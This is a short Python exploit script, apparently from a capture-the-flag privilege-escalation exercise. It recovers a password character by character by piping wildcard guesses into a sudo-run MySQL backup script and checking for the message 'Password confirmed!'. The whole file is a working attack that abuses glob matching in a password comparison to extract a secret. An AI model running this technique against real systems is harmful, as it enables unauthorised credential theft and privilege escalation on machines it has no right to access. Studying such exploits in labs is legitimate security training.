import subprocess
import string

# create a list with all alphanumeric characters
charList = list(string.ascii_letters + string.digits)
# set initial password as an empty string
password = ""
passwordMissing = True

while passwordMissing:
    # try every character in the list
    for char in charList:
        # define the command to be executed
        command = f"echo '{password}{char}*' | sudo /opt/scripts/mysql-backup.sh"
        # 
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        # if this message (defined in the `mysql-back.sh` script) is within the output
        if "Password confirmed!" in output:
            # append character in the password variable
            password += char
            # print the current state of the password
            print(password)
            # don't iterate through the rest of the letters and go to next position instead
            break
    else:
        passwordMissing = False








